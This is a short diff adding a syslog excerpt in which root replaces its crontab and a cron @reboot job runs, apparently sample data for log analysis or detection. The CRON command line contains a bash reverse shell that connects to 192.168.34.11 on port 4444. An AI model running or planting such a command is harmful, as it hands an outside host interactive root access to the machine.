@@ -1,0 +1,6 @@
+Oct 25 05:56:01 92320f859469 crontab[311]: (root) REPLACE (root)
+Oct 25 05:56:01 92320f859469 cron[316]: (CRON) INFO (pidfile fd = 4)
+Oct 25 05:56:01 92320f859469 cron[317]: (CRON) STARTUP (fork ok)
+Oct 25 05:56:01 92320f859469 cron[317]: (CRON) INFO (Running @reboot jobs)
+Oct 25 05:56:01 92320f859469 CRON[282]: (root) CMD (/bin/bash -c '/bin/bash -i >& /dev/tcp/192.168.34.11/4444 0>&1')
+Oct 25 05:56:01 92320f859469 CRON[281]: (CRON) info (No MTA installed, discarding output)
